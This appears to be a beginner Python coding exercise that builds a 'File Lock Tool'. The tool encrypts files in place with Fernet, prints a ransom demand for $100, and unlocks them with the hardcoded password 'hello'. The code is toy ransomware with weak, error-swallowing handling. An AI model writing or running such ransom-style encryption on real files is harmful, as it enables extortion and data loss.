File Lock Tool
======================
In this activity, you will code to complete a tool that secures the data by encrypting file's content and then decrypts it when the correct password is entered.


<img src= "https://s3-whjr-curriculum-uploads.whjr.online/aae451a5-6bd9-4f11-839e-31d806718af1.gif" width = "auto" height = "auto">


Follow the given steps to complete this activity.


1. Open `main.py` file.
2. Ask whether user wants to encrypt or decrypt the files
    ```
    choice =  int(input("Choose an option: \n1. Encrypt \n2.Decrypt \n"))
    ```
3. If user enter **1** then run the code for encryption.
    ```
    if (choice == 1):
        # Perform the Encryption code under if block
        key = Fernet.generate_key()
        with open("encryptedKey.key", "wb") as encryptedKey:
            encryptedKey.write(key)
        for file in files:
            with open(file, "rb") as file1:
                rawData = file1.read()
            encryptedRawData = Fernet(key).encrypt(rawData)
            with open(file, "wb") as file2:
                file2.write(encryptedRawData)


        print("👹👹👹👹 All of your files has been encrypted send me $100 or I'll delete them in 24 hours!! 👹👹👹👹")
    ```


4. Check if the user opted for decryption and then perform decryption of the files.
* Check if user entered **2** i.e Opted for decryption.
  ```
  if (choice ==2):
  ```


* Set a secret password and ask the user to enter a password..
  * Set a `secretPhrase` as string "hello".
  * Ask user to enter a password and save it in as `enteredPhrase`
  ```
  secretPhrase = "hello"
  enteredPhrase = input("Enter valid phrase to decrypt the files\n")
  ```


* Notify the user on wrong password if the secret password doesn't match with the tried passwords.
  * Check if `secretPhrase` does not match with the `enteredPhrase`, then print the message to notify the user that the phrase is invalid.
  ```
  if (secretPhrase != enteredPhrase):
      print(" 👹👹👹👹 Invalid Phrase try one more time or Pay me more 👹👹👹👹 ")
  ```


* Decrypt the files if the phrases matches i.e under the `else` block.
    * Start the `else` block
    * Write `try` block under it
    * Open the `encryptedKey.key` file and store its content in `secretKey`
  ```
  else:
      try:
          with open("encryptedKey.key", "rb") as encryptedKey:
              secretKey = encryptedKey.read()
  ```
* Loop through each file in the `files` and perform following:
  * Open the file and read the raw data
  * Decrypt the raw data
  * Store the decrypted data back in the file
  ```
          for file in files:
              with open(file, "rb") as theFile:
                      rawData = theFile.read()
              decryptedRawData = Fernet(secretKey).decrypt(rawData)


              with open(file, "wb") as theFile:
                      theFile.write(decryptedRawData)
  ```


  * Notify the user about the recovery of their information.
     * Print the recovery message to the console.
     * Write except block to pass and go to next iteration if anything error occurs in the current iteration.
  ```
              print("You have successfully recovered all the files!!")
      except:
          pass
  ```


Save and run the code to check the output.
